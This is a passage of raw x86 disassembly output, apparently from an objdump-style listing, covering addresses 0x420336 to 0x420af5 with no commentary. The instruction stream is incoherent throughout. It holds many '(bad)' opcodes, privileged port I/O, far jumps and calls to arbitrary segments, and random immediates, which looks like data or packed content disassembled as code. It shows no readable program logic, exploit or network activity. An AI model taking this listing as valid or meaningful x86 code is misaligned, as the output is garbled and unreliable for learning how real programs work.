  420336:	out    0x6e,eax
  420338:	rol    BYTE PTR [esi-0x3d42e8e6],cl
  42033e:	loope  0x420341
  420340:	dec    ebp
  420341:	mov    ah,0x3d
  420343:	sti    
  420344:	sub    dl,bh
  420346:	xchg   DWORD PTR [edi+0x1a7e0a43],edi
  42034c:	rcr    BYTE PTR [eax-0x4e],cl
  42034f:	mov    al,ds:0xc712ef74
  420354:	test   al,0xe9
  420356:	jmp    0x454d36f
  42035b:	xchg   ecx,eax
  42035c:	mov    WORD PTR [ebp+0x41],ds
  42035f:	add    DWORD PTR [ebx],edi
  420361:	mov    ah,0x3d
  420363:	or     BYTE PTR [edi-0x4],ah
  420366:	hlt    
  420367:	test   al,0xfd
  420369:	mov    ebp,0xb0b25197
  42036e:	int3   
  42036f:	cmp    ch,ah
  420371:	cdq    
  420372:	call   0xc0af:0x18746b3e
  420379:	(bad)  [esi-0x44]
  42037c:	les    ebx,FWORD PTR [esp+eiz*8-0x7c]
  420380:	sub    BYTE PTR [esi+edx*8+0x2e],cl
  420384:	pop    esi
  420385:	mov    cs,WORD PTR [edi]
  420387:	pop    ebp
  420388:	ret    
  420389:	dec    esp
  42038a:	test   eax,0x816ff3c7
  42038f:	imul   BYTE PTR [esp+ecx*2-0x6d]
  420393:	cdq    
  420394:	out    0xa4,eax
  420396:	imul   DWORD PTR [edx-0x323cebf7]
  42039c:	jno    0x42034c
  42039e:	push   ds
  42039f:	ds pop edi
  4203a1:	xchg   edx,eax
  4203a2:	mov    dl,0x1c
  4203a4:	mul    DWORD PTR [edi-0x772df7c2]
  4203aa:	sub    al,ah
  4203ac:	(bad)  
  4203ad:	adc    BYTE PTR [eax+0x43],bl
  4203b0:	jg     0x420355
  4203b2:	or     dh,bh
  4203b4:	jnp    0x420421
  4203b6:	inc    esp
  4203b7:	loope  0x420437
  4203b9:	data16 jb 0x42037d
  4203bc:	cld    
  4203bd:	lods   eax,DWORD PTR ds:[esi]
  4203be:	dec    ebp
  4203bf:	mov    al,0x24
  4203c1:	mov    esp,0x7b080c1f
  4203c6:	icebp  
  4203c7:	mov    ebx,0x239b97bc
  4203cc:	icebp  
  4203cd:	scas   eax,DWORD PTR es:[edi]
  4203ce:	add    eax,0xa7ed61e4
  4203d3:	ret    0xf5dc
  4203d6:	scas   al,BYTE PTR es:[edi]
  4203d7:	fwait
  4203d8:	addr16 call 0x407d:0xaade5f92
  4203e0:	push   esp
  4203e1:	outs   dx,DWORD PTR ds:[esi]
  4203e2:	xor    edx,DWORD PTR ds:0x43ea3ed0
  4203e8:	repnz (bad) 
  4203ea:	xchg   ebp,eax
  4203eb:	fisub  WORD PTR [edi-0x3a638bcb]
  4203f1:	pop    ebx
  4203f2:	sbb    eax,DWORD PTR [ebp-0x6c]
  4203f5:	sub    DWORD PTR [eax+0x66d8d5db],esp
  4203fb:	push   ds
  4203fc:	dec    ebx
  4203fd:	nop
  4203fe:	mov    DWORD PTR [ecx],ecx
  420400:	or     BYTE PTR [ecx-0x30],bh
  420403:	adc    bh,BYTE PTR [eax]
  420405:	adc    al,ch
  420407:	ins    BYTE PTR es:[edi],dx
  420408:	adc    al,0x4a
  42040a:	sub    DWORD PTR ds:0x98c6698e,ecx
  420410:	pop    es
  420411:	and    BYTE PTR [ecx],ch
  420413:	jnp    0x420465
  420415:	sti    
  420416:	dec    BYTE PTR [eax-0x30]
  420419:	push   0x61d4d2ff
  42041e:	or     al,0x3b
  420420:	jmp    0x4203e3
  420422:	test   al,0xc3
  420424:	pop    ebx
  420425:	iret   
  420426:	jle    0x4203f4
  420428:	mov    ah,0xdd
  42042a:	leave  
  42042b:	dec    edi
  42042c:	and    edx,eax
  42042e:	mov    BYTE PTR [esi+0x3478217d],bh
  420434:	jge    0x42043e
  420436:	and    dh,BYTE PTR ds:0x42b2838f
  42043c:	cmp    eax,0x39f86045
  420441:	sub    ecx,ebp
  420443:	mov    eax,ebp
  420445:	adc    eax,0xffffff83
  420448:	sbb    BYTE PTR [eax-0x1c9c6221],0x6b
  42044f:	cmp    bl,BYTE PTR [ebx+0x4d93c144]
  420455:	jp     0x420473
  420457:	or     DWORD PTR [ebp-0xdc2e12a],edi
  42045d:	pusha  
  42045e:	xor    BYTE PTR [ebp+0xd],cl
  420461:	sub    eax,DWORD PTR [ebx-0x56114021]
  420467:	vmread eax,esi
  42046a:	inc    esp
  42046b:	adc    eax,eax
  42046d:	ret    0x3176
  420470:	call   0xebbf1beb
  420475:	mov    edi,0x1ec2361
  42047a:	test   eax,0x99f707b2
  42047f:	jns    0x42047a
  420481:	dec    esi
  420482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420483:	mov    edx,0x5e9497ca
  420488:	inc    esi
  420489:	and    al,dh
  42048b:	mov    ds:0x84778440,eax
  420490:	fsub   st,st(3)
  420492:	(bad)  
  420493:	test   al,0x8d
  420495:	(bad)  
  420496:	(bad)  
  420497:	cmp    eax,0xeead1532
  42049c:	in     al,dx
  42049d:	in     al,0x29
  42049f:	lea    ebx,[ebp+0x6a42c7f7]
  4204a5:	inc    ebx
  4204a6:	sub    al,0x78
  4204a8:	(bad)  
  4204a9:	shl    BYTE PTR [esi+eiz*4],0xd3
  4204ad:	cmp    DWORD PTR [esi+0x62],ebx
  4204b0:	fldcw  WORD PTR [ebx-0x75d53cc1]
  4204b6:	fwait
  4204b7:	sbb    dh,BYTE PTR [ebx+0x7bda5b32]
  4204bd:	rcl    DWORD PTR [eax],1
  4204bf:	enter  0x64a0,0xee
  4204c3:	aas    
  4204c4:	cmc    
  4204c5:	shl    BYTE PTR [ebp+0x6bfc62eb],1
  4204cb:	outs   dx,BYTE PTR ds:[esi]
  4204cc:	adc    ecx,DWORD PTR [esi-0x74]
  4204cf:	mov    dl,BYTE PTR [eax]
  4204d1:	faddp  st(1),st
  4204d3:	bound  ebp,QWORD PTR [ebp-0x3a]
  4204d6:	les    edx,FWORD PTR [eax-0x44]
  4204d9:	or     ecx,ecx
  4204db:	xchg   esp,eax
  4204dc:	imul   eax,DWORD PTR [eax+edx*2+0x1df885fd],0x6f661cd3
  4204e7:	mov    ebp,0x894f1a9f
  4204ec:	les    eax,FWORD PTR [ebp-0x58]
  4204ef:	inc    ebx
  4204f0:	addr16 ret 
  4204f2:	loopne 0x4204a2
  4204f4:	jmp    0x8bac:0xda95178
  4204fb:	imul   eax,DWORD PTR [ebx],0xffffffe7
  4204fe:	outs   dx,DWORD PTR ds:[esi]
  4204ff:	mov    eax,ds:0x6c5245a
  420504:	rcl    BYTE PTR [edi+0x78f024f9],0x14
  42050b:	dec    ebp
  42050c:	sbb    eax,0x91002f79
  420511:	jle    0x42058a
  420513:	ror    bh,1
  420515:	mov    ecx,edx
  420517:	and    al,0x98
  420519:	pushf  
  42051a:	mov    edi,0x274e3689
  42051f:	repnz test eax,0xe3e66880
  420525:	push   cs
  420526:	pop    ecx
  420527:	cmp    BYTE PTR [ebp+0x2d6da6b8],dh
  42052d:	push   ebx
  42052e:	mov    ebp,0xd815f3d4
  420533:	std    
  420534:	pusha  
  420535:	imul   ecx,DWORD PTR [esi+0x70da0a30],0xc7cc6876
  42053f:	or     eax,0x5a1e1742
  420545:	jle    0x42057d
  420547:	jg     0x4205aa
  420549:	(bad)  [ebx+0x64]
  42054c:	sub    bl,BYTE PTR fs:[eax-0xf0e2926]
  420553:	push   edx
  420554:	mov    WORD PTR [ecx],ss
  420556:	dec    eax
  420557:	call   0x60c0af8f
  42055c:	pop    ds
  42055d:	and    DWORD PTR ds:0x164fbc12,0xffffffd2
  420564:	push   cs
  420565:	and    eax,0x8058691c
  42056a:	mov    eax,ds:0xb387dd58
  42056f:	xchg   ebx,eax
  420570:	add    bh,BYTE PTR [esi-0x7a]
  420573:	aaa    
  420574:	lahf   
  420575:	push   ecx
  420576:	mov    dl,0x2d
  420578:	loope  0x4205ae
  42057a:	cmp    eax,0x8c54861b
  42057f:	iret   
  420580:	and    al,0xc2
  420582:	scas   eax,DWORD PTR es:[edi]
  420583:	jno    0x42054b
  420585:	sahf   
  420586:	fucomi st,st(5)
  420588:	retf   0xdec5
  42058b:	mov    bl,0xb1
  42058d:	ss jp  0x420584
  420590:	sbb    al,0xb2
  420592:	adc    eax,0xb705cffa
  420597:	rcr    edi,1
  420599:	imul   esi,DWORD PTR [edx-0x48abf76b],0x97226d6a
  4205a3:	mov    bl,0x71
  4205a5:	(bad)
  4205a8:	idiv   ebx
  4205aa:	mov    eax,ds:0xea3804ce
  4205af:	add    ecx,DWORD PTR [eax+0x6]
  4205b2:	mov    ebp,0x64214b1d
  4205b7:	addr16 enter 0xdf0d,0x83
  4205bc:	outs   dx,BYTE PTR ds:[esi]
  4205bd:	pop    es
  4205be:	jb     0x420564
  4205c0:	out    dx,eax
  4205c1:	bound  edi,QWORD PTR ds:0x5179dadc
  4205c7:	(bad)  
  4205c8:	cmp    bh,BYTE PTR [ebx-0x2]
  4205cb:	ins    BYTE PTR es:[edi],dx
  4205cc:	mov    ecx,0x97bd5024
  4205d1:	xchg   BYTE PTR [ebp+0x54],dl
  4205d4:	sbb    ah,BYTE PTR [edx-0x16]
  4205d7:	push   es
  4205d8:	xchg   edi,eax
  4205d9:	repnz aam 0x5f
  4205dc:	nop
  4205dd:	scas   eax,DWORD PTR es:[edi]
  4205de:	cs jmp 0xfb1ea10b
  4205e4:	pop    esp
  4205e5:	pop    esi
  4205e6:	clc    
  4205e7:	adc    eax,0x88e789c9
  4205ec:	cmp    al,0x7d
  4205ee:	pop    ecx
  4205ef:	ins    BYTE PTR es:[edi],dx
  4205f0:	hlt    
  4205f1:	data16 fdivr st,st(5)
  4205f4:	pop    ecx
  4205f5:	pop    ebx
  4205f6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4205f8:	sub    esi,DWORD PTR [edx]
  4205fa:	cdq    
  4205fb:	loope  0x42062d
  4205fd:	jg     0x4205ad
  4205ff:	into   
  420600:	dec    esp
  420601:	(bad)  
  420602:	cwde   
  420603:	std    
  420604:	mov    ebx,0xf9a8d3a8
  420609:	call   0xed5914fe
  42060e:	xchg   edi,eax
  42060f:	xlat   BYTE PTR ds:[ebx]
  420610:	jmp    FWORD PTR [ecx+0x34f09892]
  420616:	sbb    ecx,ebx
  420618:	mov    eax,0x4113b764
  42061d:	std    
  42061e:	push   ebx
  42061f:	or     DWORD PTR [ebp-0x78],esi
  420622:	or     al,0xc8
  420624:	jo     0x420691
  420626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420627:	shr    BYTE PTR [ecx-0x3dfae055],0xb9
  42062e:	nop
  42062f:	ja     0x42063c
  420631:	and    dl,BYTE PTR [edi+0x1]
  420634:	adc    BYTE PTR [edx-0x6ba2a7c6],0x24
  42063b:	outs   dx,BYTE PTR ds:[esi]
  42063c:	xchg   ebx,eax
  42063d:	cld    
  42063e:	imul   eax,DWORD PTR [edx+eiz*1-0x5b],0xc54eacd5
  420646:	and    al,0x50
  420648:	sbb    al,0xb8
  42064a:	dec    esp
  42064b:	shl    DWORD PTR [ebp+0x4a97286d],cl
  420651:	adc    ah,bl
  420653:	dec    ecx
  420654:	stc    
  420655:	cdq    
  420656:	bound  edx,QWORD PTR [edx]
  420658:	or     eax,0xb180cdf5
  42065d:	repnz sti 
  42065f:	loopne 0x42069c
  420661:	fwait
  420662:	in     al,0xcd
  420664:	sbb    BYTE PTR [eax-0x173ec031],ch
  42066a:	pop    ss
  42066b:	pop    ebp
  42066c:	ds stos DWORD PTR es:[edi],eax
  42066e:	call   0x531b18ea
  420673:	out    0x83,eax
  420675:	das    
  420676:	dec    eax
  420677:	pop    edi
  420678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420679:	(bad)  
  42067a:	jo     0x420631
  42067c:	or     cl,al
  42067e:	mov    esi,0x2011f79
  420683:	mov    dh,0xfe
  420685:	(bad)  
  420686:	mov    BYTE PTR [ebx],ch
  420688:	outs   dx,DWORD PTR ds:[esi]
  420689:	(bad)  
  42068a:	adc    al,0x63
  42068c:	mov    ah,0x60
  42068e:	pop    ebx
  42068f:	dec    ebp
  420690:	pop    es
  420691:	xor    BYTE PTR [eax+ecx*8],cl
  420694:	xchg   ebx,eax
  420695:	push   0x94c7102f
  42069a:	outs   dx,DWORD PTR ds:[esi]
  42069b:	sar    BYTE PTR [ecx+0x3d],0x45
  42069f:	dec    edx
  4206a0:	sbb    eax,0x786c87a
  4206a5:	mov    bh,0xad
  4206a7:	mov    eax,0x33b7bbeb
  4206ac:	mov    ebx,ecx
  4206ae:	jge    0x4206c5
  4206b0:	mov    ah,0x9b
  4206b2:	in     al,dx
  4206b3:	fs clc 
  4206b5:	or     edx,ebp
  4206b7:	pop    ds
  4206b8:	push   es
  4206b9:	xor    ah,0x57
  4206bc:	hlt    
  4206bd:	or     BYTE PTR [edi],dl
  4206bf:	or     al,0x80
  4206c1:	or     al,0xc0
  4206c3:	inc    ebx
  4206c4:	inc    edx
  4206c5:	nop    DWORD PTR [eax+0x2b1707ae]
  4206cc:	mov    bl,0x30
  4206ce:	lods   al,BYTE PTR ds:[esi]
  4206cf:	pop    es
  4206d0:	fsubp  st(7),st
  4206d2:	es cmp bl,ah
  4206d5:	mov    ecx,0x9ecb6274
  4206da:	inc    eax
  4206db:	push   es
  4206dc:	shrd   DWORD PTR [edi-0x5bff266d],esi,cl
  4206e3:	add    al,0x1d
  4206e5:	or     al,0x46
  4206e7:	pop    ds
  4206e8:	clc    
  4206e9:	mov    dh,BYTE PTR [ecx-0x9]
  4206ec:	inc    edx
  4206ed:	mov    ss,WORD PTR [ebx]
  4206ef:	mov    bh,0x6f
  4206f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206f2:	addr16 cdq 
  4206f4:	add    edi,DWORD PTR [ebp+0x11]
  4206f7:	ror    bl,1
  4206f9:	fistp  QWORD PTR [ebp+0x5f]
  4206fc:	retf   
  4206fd:	rcr    DWORD PTR [edx+0x528a7856],1
  420703:	int    0x47
  420705:	std    
  420706:	adc    BYTE PTR [esi],0xcf
  420709:	rcr    BYTE PTR [edi],cl
  42070b:	pop    ss
  42070c:	mov    bh,0xd2
  42070e:	mov    dl,0x6d
  420710:	pop    edi
  420711:	dec    esp
  420712:	ja     0x420699
  420714:	fsubr  st(7),st
  420716:	or     al,0x4b
  420718:	or     BYTE PTR [edx-0x524eeb53],al
  42071e:	ret    0x9a32
  420721:	ds dec edi
  420723:	sahf   
  420724:	test   al,0xba
  420726:	jb     0x420788
  420728:	inc    edi
  420729:	mov    ds:0x2c1ca228,eax
  42072e:	mov    edi,0x22726961
  420733:	arpl   WORD PTR [ebp+0x14],dx
  420736:	sub    eax,DWORD PTR ds:0xac00ab0d
  42073c:	dec    ecx
  42073d:	icebp  
  42073e:	in     al,0xe3
  420740:	lahf   
  420741:	retf   0x8c6b
  420744:	pop    ebp
  420745:	imul   edx,DWORD PTR [ebp+edx*8+0x6f4b2e9d],0x4e03e65d
  420750:	aam    0xd2
  420752:	addr16 into 
  420754:	adc    BYTE PTR [ecx-0x2a4f3976],dl
  42075a:	je     0x42071d
  42075c:	and    DWORD PTR [ebx],edx
  42075e:	sahf   
  42075f:	push   eax
  420760:	adc    ah,BYTE PTR [eax+eiz*8]
  420763:	xchg   esp,eax
  420764:	imul   esi,DWORD PTR [esi+0x7f],0xdc074344
  42076b:	dec    ebx
  42076c:	cdq    
  42076d:	addr16 mov bl,0x52
  420770:	jb     0x420736
  420772:	aas    
  420773:	cdq    
  420774:	mov    edi,0x96627362
  420779:	into   
  42077a:	(bad)  
  42077b:	std    
  42077c:	xchg   bl,al
  42077e:	jg     0x420704
  420780:	or     DWORD PTR [ebp+esi*2-0x58],ebx
  420784:	mov    bl,0xc2
  420786:	cmp    al,0x2a
  420788:	ret    0x63ae
  42078b:	js     0x420765
  42078d:	inc    ebp
  42078e:	scas   al,BYTE PTR es:[edi]
  42078f:	cmp    DWORD PTR [esi+ecx*2-0x45b24fdb],0x1c
  420797:	aaa    
  420798:	adc    DWORD PTR [esi+eax*4],edi
  42079b:	sahf   
  42079c:	jmp    0x664:0xd81d080a
  4207a3:	stc    
  4207a4:	int    0x17
  4207a6:	ds out 0xb2,eax
  4207a9:	jae    0x4207cd
  4207ab:	or     dl,BYTE PTR [ebx-0x797db32e]
  4207b1:	mov    esp,0xa4d42a37
  4207b6:	add    al,0xc8
  4207b8:	retf   
  4207b9:	pushf  
  4207ba:	or     ebp,ebx
  4207bc:	mov    DWORD PTR [esp+ebx*1],edi
  4207bf:	icebp  
  4207c0:	shl    BYTE PTR [ecx-0x5a],0x9b
  4207c4:	pushf  
  4207c5:	sbb    BYTE PTR [esi-0x79c9cf63],0xf2
  4207cc:	adc    ebp,0xd92f7c0d
  4207d2:	into   
  4207d3:	lds    esi,FWORD PTR [ebx+0x210a1784]
  4207d9:	cmc    
  4207da:	add    eax,0xd71fa62b
  4207df:	sub    DWORD PTR [ecx-0xf],edx
  4207e2:	scas   al,BYTE PTR es:[edi]
  4207e3:	push   cs
  4207e4:	in     eax,dx
  4207e5:	jecxz  0x420772
  4207e7:	jnp    0x4207a4
  4207e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207ea:	mov    cl,0x4a
  4207ec:	stc    
  4207ed:	push   cs
  4207ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ef:	mov    eax,0x577d4a9a
  4207f4:	ficom  DWORD PTR [ebx+0x4c89d6c5]
  4207fa:	jns    0x420795
  4207fc:	xchg   edx,eax
  4207fd:	pop    ebp
  4207fe:	push   ss
  4207ff:	cmp    DWORD PTR [ecx+0x7fd133c9],esi
  420805:	add    edx,DWORD PTR [edx+0x16]
  420808:	inc    eax
  420809:	das    
  42080a:	xchg   esp,eax
  42080b:	push   edx
  42080c:	test   BYTE PTR [edi],bh
  42080e:	hlt    
  42080f:	icebp  
  420810:	ins    DWORD PTR es:[edi],dx
  420811:	das    
  420812:	(bad)  
  420813:	daa    
  420814:	nop
  420815:	xchg   ebx,eax
  420816:	mov    esi,cs
  420818:	xchg   edx,eax
  420819:	cmp    DWORD PTR [ecx-0x31],esp
  42081c:	das    
  42081d:	mov    dl,0x99
  42081f:	retf   
  420820:	inc    ecx
  420821:	and    DWORD PTR [edi],edi
  420823:	pop    esi
  420824:	(bad)  
  420825:	aad    0x65
  420827:	adc    BYTE PTR [edx-0x33e28e95],dl
  42082d:	jnp    0x4208a9
  42082f:	pop    es
  420830:	adc    eax,0x705c492b
  420835:	out    0x10,eax
  420837:	and    ah,BYTE PTR [ecx-0x281cb8e8]
  42083d:	fistp  WORD PTR [eax+0x73]
  420840:	fld    DWORD PTR [ebx+0x7]
  420843:	std    
  420844:	scas   al,BYTE PTR es:[edi]
  420845:	(bad)  
  420846:	fisub  DWORD PTR [edi+0x4e]
  420849:	(bad)  
  42084a:	lahf   
  42084b:	ror    BYTE PTR [esi+0x55],0x1a
  42084f:	int    0xfd
  420851:	scas   eax,DWORD PTR es:[edi]
  420852:	imul   ebx,DWORD PTR [esi-0x6e],0x7e4ead96
  420859:	push   ebx
  42085a:	mov    DWORD PTR [edx+0x69b32288],esi
  420860:	lods   al,BYTE PTR ds:[esi]
  420861:	hlt    
  420862:	stos   DWORD PTR es:[edi],eax
  420863:	out    dx,al
  420864:	jb     0x420886
  420866:	dec    ecx
  420867:	dec    edx
  420868:	or     eax,DWORD PTR [edx]
  42086a:	leave  
  42086b:	test   eax,0x5a3a14a6
  420870:	dec    ebp
  420871:	sbb    ah,BYTE PTR [esi]
  420873:	jle    0x420876
  420875:	(bad)  
  420876:	ss enter 0xe0c6,0x2e
  42087b:	push   ebx
  42087c:	mov    al,BYTE PTR ss:[esi+0x555cd1b]
  420883:	xor    BYTE PTR [edx+0x72],al
  420886:	mov    edi,0xbfd8fc66
  42088b:	xchg   ebp,eax
  42088c:	jp     0x4208f8
  42088e:	and    ebp,0x530f6ef
  420894:	pop    ds
  420895:	div    cl
  420897:	jo     0x42090a
  420899:	jle    0x420858
  42089b:	inc    ebp
  42089c:	sub    bh,cl
  42089e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42089f:	mov    eax,gs
  4208a1:	cmp    al,BYTE PTR [edi]
  4208a3:	fistp  QWORD PTR [edx]
  4208a5:	jmp    0xc84b:0x7d3fe099
  4208ac:	cdq    
  4208ad:	aam    0x80
  4208af:	imul   eax,DWORD PTR [eax],0xdccdae24
  4208b5:	dec    ecx
  4208b6:	push   edi
  4208b7:	push   0xd444df5b
  4208bc:	inc    ebx
  4208bd:	retf   0x4f6d
  4208c0:	or     BYTE PTR [ebp-0x3b],dh
  4208c3:	add    al,0x1e
  4208c5:	jbe    0x420892
  4208c7:	call   0x4867:0x77768fd2
  4208ce:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4208d0:	ss jecxz 0x42086b
  4208d3:	sar    BYTE PTR ds:0x5b36564,0xf2
  4208da:	call   0x66e1:0x45504794
  4208e1:	xchg   ebx,eax
  4208e3:	(bad)  
  4208e4:	cmp    BYTE PTR [ecx+edx*4-0xf],dh
  4208e8:	mov    dl,BYTE PTR [edi]
  4208ea:	pop    esi
  4208eb:	xchg   ecx,eax
  4208ec:	jo     0x4208d2
  4208ee:	mov    WORD PTR [edx+0x7],?
  4208f1:	dec    ebp
  4208f2:	sbb    eax,0x40b182a1
  4208f7:	inc    edx
  4208f8:	push   0xaa37a04c
  4208fd:	and    al,0x16
  4208ff:	fadd   DWORD PTR [ebp+0x204aa3e7]
  420905:	inc    ebp
  420906:	rcl    BYTE PTR [esi+edx*1-0xe],cl
  42090a:	scas   eax,DWORD PTR es:[edi]
  42090b:	aam    0xd5
  42090d:	dec    ebp
  42090e:	aad    0x9
  420910:	mov    ebp,0x84cef336
  420915:	cld    
  420916:	pusha  
  420917:	and    DWORD PTR [eax],edx
  420919:	xchg   esp,eax
  42091a:	shl    BYTE PTR [ebp-0x55e4a640],1
  420920:	mov    DWORD PTR [ebx+0x44],edx
  420923:	xchg   edx,eax
  420924:	add    ch,bl
  420926:	les    edi,FWORD PTR [eax-0x20e2e122]
  42092c:	sahf   
  42092d:	pushf  
  42092e:	sbb    al,0x3c
  420930:	jne    0x4209a0
  420932:	sub    BYTE PTR [ecx-0x41],ch
  420935:	or     BYTE PTR [eax],ah
  420937:	(bad)  
  420938:	xor    BYTE PTR [eiz*8-0x7e5a662e],dh
  42093f:	or     DWORD PTR [edx+edi*8],ebx
  420942:	push   ds
  420943:	and    bl,BYTE PTR ds:0xd797a377
  420949:	sahf   
  42094a:	jl     0x4208df
  42094c:	push   ebp
  42094d:	sbb    al,BYTE PTR [esi+0x6fa3a9a5]
  420953:	rcr    BYTE PTR fs:[eax],cl
  420956:	and    ch,BYTE PTR [eax+eiz*8-0x48]
  42095a:	mov    ds:0x8e8ead9b,eax
  42095f:	outs   dx,BYTE PTR ds:[esi]
  420960:	sbb    cl,BYTE PTR [ebx-0x3f]
  420963:	dec    esp
  420964:	fsubr  DWORD PTR [edi]
  420966:	mov    bh,0x72
  420968:	test   BYTE PTR [edx+esi*1+0x1d2741d6],dl
  42096f:	ja     0x42091d
  420971:	(bad)  
  420972:	(bad)  
  420973:	sar    BYTE PTR [eax+0x31],1
  420976:	jno    0x4209e4
  420978:	or     dl,BYTE PTR [eax]
  42097a:	aad    0x57
  42097c:	adc    cl,BYTE PTR [ebx]
  42097e:	push   edi
  42097f:	rcr    DWORD PTR [ecx],1
  420981:	mov    eax,ds:0xa5a09415
  420986:	ss dec ebx
  420988:	neg    DWORD PTR [ecx+0x2e]
  42098b:	fmul   QWORD PTR [edi]
  42098d:	cdq    
  42098e:	mov    edx,0xf242c00f
  420993:	sbb    al,0x5e
  420995:	fs loope 0x420964
  420998:	shl    DWORD PTR [esp+eiz*4+0x5a],1
  42099c:	and    eax,0x27550c7b
  4209a1:	mov    cl,BYTE PTR [edx]
  4209a3:	sbb    ch,BYTE PTR [eax-0x43fa0a0e]
  4209a9:	inc    ebp
  4209aa:	dec    ecx
  4209ab:	int3   
  4209ac:	fdivr  QWORD PTR [edx+esi*2-0x4c]
  4209b0:	repnz pop edx
  4209b2:	inc    ebx
  4209b3:	mov    DWORD PTR [ecx-0x2],edx
  4209b6:	stos   DWORD PTR es:[edi],eax
  4209b7:	inc    ebx
  4209b8:	ss jnp 0x4209d3
  4209bb:	cld    
  4209bc:	mov    ebp,0x9a25e57a
  4209c1:	cmp    ebp,0xffffff88
  4209c4:	fstp   DWORD PTR [eax+0xe0dca4b]
  4209ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209cb:	xor    al,BYTE PTR [ecx+eax*8+0x2b26fb66]
  4209d2:	in     eax,dx
  4209d3:	add    al,0x5e
  4209d5:	lods   eax,DWORD PTR ds:[esi]
  4209d6:	push   ecx
  4209d7:	aad    0x5e
  4209d9:	jge    0x420a41
  4209db:	aaa    
  4209dc:	lea    ebx,[edi]
  4209de:	or     eax,0xfee5251
  4209e3:	pop    ebp
  4209e4:	fs inc eax
  4209e6:	push   esi
  4209e7:	(bad)  
  4209e8:	stos   BYTE PTR es:[edi],al
  4209e9:	sub    edi,ebx
  4209eb:	dec    eax
  4209ec:	dec    ebp
  4209ed:	dec    eax
  4209ee:	lods   eax,DWORD PTR ds:[esi]
  4209ef:	retf   0x96f8
  4209f2:	mov    bh,0xd3
  4209f4:	stc    
  4209f5:	add    DWORD PTR [ecx-0x67],ebx
  4209f8:	push   cs
  4209f9:	repz jmp 0x39b3:0x5480f357
  420a01:	cmp    BYTE PTR [ebp+0x48],ah
  420a04:	(bad)  
  420a05:	mov    eax,DWORD PTR [esi+eiz*2]
  420a08:	xchg   ebp,eax
  420a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a0a:	sti    
  420a0b:	adc    al,0x8
  420a0d:	lods   eax,DWORD PTR ds:[esi]
  420a0e:	ds jge 0x420a4c
  420a11:	adc    dl,bh
  420a13:	lods   al,BYTE PTR ds:[esi]
  420a14:	xchg   ebx,eax
  420a15:	add    DWORD PTR [esp+edi*8+0x41d23e52],edx
  420a1c:	dec    ebx
  420a1d:	pop    ds
  420a1e:	idiv   DWORD PTR [eax]
  420a20:	jg     0x4209d8
  420a22:	ins    BYTE PTR es:[edi],dx
  420a23:	sbb    eax,0x69d8ce82
  420a28:	adc    DWORD PTR [ebp+0x47ed43a3],eax
  420a2e:	(bad)  
  420a2f:	stc    
  420a30:	aam    0xf
  420a32:	or     eax,0x7896e149
  420a37:	mov    ecx,0xd397046f
  420a3c:	xchg   ebx,eax
  420a3d:	adc    cl,BYTE PTR [eax+0x4aef2508]
  420a43:	mov    cl,BYTE PTR [edi]
  420a45:	and    DWORD PTR [edi],edx
  420a47:	loopne 0x4209ca
  420a49:	xor    ch,BYTE PTR [eax]
  420a4b:	and    al,0x54
  420a4d:	imul   esp,DWORD PTR [ebp-0x63],0xffffff82
  420a51:	or     BYTE PTR [edx],0x5
  420a54:	cld    
  420a55:	dec    ebp
  420a56:	xor    eax,0x5944e161
  420a5b:	(bad)  
  420a5c:	xlat   BYTE PTR ds:[ebx]
  420a5d:	mov    esi,0xc29c7e76
  420a62:	jae    0x420a69
  420a64:	mov    edi,0xfe3569e6
  420a69:	shr    DWORD PTR [esi+0x44],1
  420a6c:	scas   al,BYTE PTR es:[edi]
  420a6d:	mov    eax,ds:0x64bce26f
  420a72:	add    al,0xc5
  420a74:	sub    esp,DWORD PTR [edi-0x230cfdef]
  420a7a:	(bad)  
  420a7b:	jmp    0xd798:0xf27861a9
  420a82:	out    0x8b,al
  420a84:	test   BYTE PTR [ecx+0x5a],cl
  420a87:	xchg   BYTE PTR [ebx-0x636110d6],cl
  420a8d:	pop    ebp
  420a8e:	cmp    esp,0x5a
  420a91:	mov    DWORD PTR [edi+0x72],ecx
  420a94:	mov    ah,0xb1
  420a96:	inc    ebx
  420a97:	out    dx,al
  420a98:	xor    al,0xa
  420a9a:	(bad)  
  420a9b:	je     0x420ae9
  420a9d:	inc    edx
  420a9e:	(bad)  
  420a9f:	dec    ebp
  420aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa1:	(bad)  
  420aa2:	sbb    DWORD PTR [edx],esp
  420aa4:	mov    BYTE PTR [esp+edi*4-0x5],ch
  420aa8:	mov    ecx,edi
  420aaa:	js     0x420a77
  420aac:	push   ss
  420aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aae:	ins    BYTE PTR es:[edi],dx
  420aaf:	js     0x420a87
  420ab1:	mov    ch,0x27
  420ab3:	mov    bl,0x62
  420ab5:	xchg   ebp,eax
  420ab6:	retf   0x9e7c
  420ab9:	sbb    esp,DWORD PTR [esi+0x100a1d57]
  420abf:	popa   
  420ac0:	and    ah,BYTE PTR fs:[ebx+0x6c1b2b02]
  420ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac9:	fcom   st(4)
  420acb:	imul   ebx,DWORD PTR [ebx],0x28
  420ace:	pop    esp
  420acf:	mov    eax,ds:0xf726d284
  420ad4:	loop   0x420a5d
  420ad6:	xchg   edx,eax
  420ad7:	pushf  
  420ad8:	jb     0x420b37
  420ada:	mov    cl,0x58
  420adc:	ret    0xf540
  420adf:	adc    bh,BYTE PTR [ebx-0x1f]
  420ae2:	lods   eax,DWORD PTR ds:[esi]
  420ae3:	imul   DWORD PTR [ebp+0x28]
  420ae6:	mov    al,ds:0xb0b0527a
  420aeb:	clc    
  420aec:	test   eax,0x7ec53af0
  420af1:	pushf  
  420af2:	lds    esi,FWORD PTR [edi+0x13]
  420af5:	test   al,0x3e
